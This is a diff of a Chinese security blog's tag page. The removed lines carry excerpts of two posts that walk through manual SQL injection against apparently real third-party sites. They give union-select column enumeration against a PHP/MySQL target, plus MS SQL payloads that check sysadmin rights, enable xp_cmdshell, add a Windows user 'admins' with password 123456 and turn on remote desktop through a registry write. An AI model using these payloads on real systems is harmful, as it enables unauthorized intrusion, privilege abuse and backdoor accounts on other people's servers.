@@ -1,161 +1,226 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Tag: 手工注入 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Tag: 手工注入 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Tag: 手工注入 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="tag-icon">手工注入</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-09-20T23:35:56.000Z" itemprop="datePublished">
-          2012-09-21
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/php/'>php</a>,
-    
-    <a href='/tag/手工注入/'>手工注入</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/836.seo/">和我一起进行php渗透</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>作者:Maxil   <br />已经发表在黑客手册2008年第三期</p>  <p>最近一直比较关注<a href="http://ha.cker.in/tag/PHP" target="_blank">PHP</a>注射的东西.学习好几天了.也应该实战一下了.目标<a href="http://app.xxxx.com">http://app.xxxx.com</a> .一个市场调查的门户.找注射点嘛,还是要用我们可爱的搜索引擎.为什么可爱呢?一会就知道了.Go Go Go !!!!!</p>  <p>在google中搜索php?id= site:xxx.com.意思就是说搜索XXX网站中以php?id=的URL.嘿.还真让我找到一个. <a href="http://app.xxx.com/cati/article_literature.php?id=11">http://app.xxx.com/cati/article_literature.php?id=11</a> .打开吓我一条，它页面本身就存在错误直接出来了绝对路径.   <br /><a href="http://img.cker.in/php_DA62/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/php_DA62/clip_image001_thumb.jpg" width="1086" height="498" /></a></p>  <p>/data01/www/cati/article_literature.php 呵呵,人品爆发了..通过路径可以得知是台Linux主机.判断下是否可以进行注射.and 1=1返回正常,and 1=2返回错误..OK存在注射.然后我们判断数据库,不出意外应该是mysql.传说中的LMAP.环境(L=Linux M=Mysql A=Apache P=Php)   <br /><a href="http://app.xxx.com/cati/article_literature.php?id=11/*">http://app.xxx.com/cati/article_literature.php?id=11/*</a> 在后面加上/<em>,返回正常则是Mysql.因为/</em>是Mysql的注释标记.</p>  <p><a href="http://img.cker.in/php_DA62/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/php_DA62/clip_image002_thumb.jpg" width="1086" height="498" /></a></p>  <p>返回正常,确定是Mysql的数据库.现在我们来检测下Mysql的版本.4.0以上支持union联合查询.一般都回是4.0已经.为什么.因为Mysql是开源的数据库不收费傻子才不更新呢.呵呵.   <br /><a href="http://app.xxx.com/cati/article_literature.php?id=11">http://app.xxx.com/cati/article_literature.php?id=11</a> and ord(mid(version(),1,1))&gt;51/<em> 如我所料.果然是4.0以上的.OK.我们来爆它的字段.    <br /><a href="http://app.xxx.com/cati/article_literature.php?id=11">http://app.xxx.com/cati/article_literature.php?id=11</a> order by 10</p>  <p><a href="http://img.cker.in/php_DA62/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/php_DA62/clip_image003_thumb.jpg" width="749" height="508" /></a></p>  <p>返回错误,说明字段小于10   <br /><a href="http://app.xxx.com/cati/article_literature.php?id=11">http://app.xxx.com/cati/article_literature.php?id=11</a> order by 9</p>  <p><a href="http://img.cker.in/php_DA62/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/php_DA62/clip_image004_thumb.jpg" width="1030" height="548" /></a></p>  <p>返回正常说明它有9个字段.OK.现在我们知道它的字段那我们就来爆它的管理员吧 呵呵.   <br /><a href="http://app.xxx.com/cati/article_literature.php?id=11">http://app.xxx.com/cati/article_literature.php?id=11</a> and 1=2 union select 1,2,3,4,5,6,7,8,9</p>  <p><a href="http://img.cker.in/php_DA62/clip_image005.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/php_DA62/clip_image005_thumb.jpg" width="848" height="337" /></a></p>  <p></p>
-      
-      </p>
-      
-      <p>
-          <a href="/836.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-21T14:30:58.000Z" itemprop="datePublished">
-          2012-06-21
-      </time>
-    
-    
-    | 
-    <a href='/tag/注入/'>注入</a>,
-    
-    <a href='/tag/注入漏洞/'>注入漏洞</a>,
-    
-    <a href='/tag/搜索型注入/'>搜索型注入</a>,
-    
-    <a href='/tag/手工注入/'>手工注入</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/584.seo/">搜索型注入漏洞手工注入过程</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>原文：<a href="http://www.90sec.org/docs/upload/day_120614/201206141204203053.txt">http://www.90sec.org/docs/upload/day_120614/201206141204203053.txt</a></p>  <p>本人是小菜，水平有限，但是为了论坛做贡献，还是自己写点原创的东西出来吧。希望大牛看了别笑就好了。。。。   <br />==================================================    <br />前段时间朋友丢了一个站过来，说是他们学校的。叫我帮忙检测下。    <br />于是看了下。用扫描器扫了下，没有啥可以上传利用的，发现后台，默认和万能密码无效，    <br />无注入点，手工和工具试过了，防注入，COOKIES注入也不行。找不到程序源码，没办法分析。旁注 ？    <br />整站是独立服务器，就一个站，旁注也没办法。难到要C段？好麻烦哦。丢给群里一些大牛看看，    <br />都说搞不定（应该是没认真看吧。），我大受打击，但是我不放弃，再去看看先。    <br />于是，发现了一个搜索框，直觉告诉我，这就是突破点，果然….. </p>  <p>前段时间的事情了，没办法截图。   <br />整个过程做了简单的笔记，和搜集了一些手工注入的代码。凑合着看吧。 </p>  <p>首先，简单的判断搜索型注入漏洞存在不存在的办法是先搜索，如果出错，说明90%存在这个漏洞。 </p>  <p>a%’ and 1=1– 正常   <br />a%’ and 1=2– 错误 </p>  <p>有注入 </p>  <p>由于网站过滤了 ‘ 等等的。所以工具不行，要手工了。累人啊~~~ </p>  <p>判断权限   <br />a%’ and (select is_member(‘dbo’))=1–&#160;&#160;&#160; 返回正常则 sa    <br />a%’ and (select is_member(‘db_owner’))=1–&#160;&#160; 返回正常则 DB    <br />都不是那就只有一种可能啦，public，权限貌似很小。 </p>  <p>也可以用另一种命令来判断权限   <br />a%’ and 1=(Select IS_SRVROLEMEMBER(‘sysadmin’));– sa    <br />a%’ and 1=(Select IS_MEMBER(‘db_owner’));– DB    <br />================================================================    <br />sa 的方法。直接建立系统帐号密码。登陆3389. </p>  <p>命令是    <br />a%’;exec master..xp_cmdshell&quot;net user admins 123456 /add&quot;– </p>  <p>如果 ‘xp_cmdshell’ 被关闭了。就来开启他。   <br />EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;reconfigure    <br />最后这个为1是开启.为0是关闭.    <br />a%’ ;EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXECsp_configure ‘xp_cmdshell’, 1;RECONFIGURE– </p>  <p>如果不开3389 </p>  <p>下面的命令。。 </p>  <p>a%’;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;– </p>
-      
-      </p>
-      
-      <p>
-          <a href="/584.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/836.seo/" title="和我一起进行php渗透" itemprop="url">
   
-  <nav class="pagination" role="pagination">
+    <h1 itemprop="name">和我一起进行php渗透</h1>
     
-    <span class="page-number">Page 1 of 1</span>
+    <time datetime="2012-09-20T23:35:56.000Z" itemprop="datePublished">2012-09-21</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/584.seo/" title="搜索型注入漏洞手工注入过程" itemprop="url">
+  
+    <h1 itemprop="name">搜索型注入漏洞手工注入过程</h1>
     
-  </nav>
-</main>
+    <time datetime="2012-06-21T14:30:58.000Z" itemprop="datePublished">2012-06-21</time>
+  </a>
+</section>
 
 
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
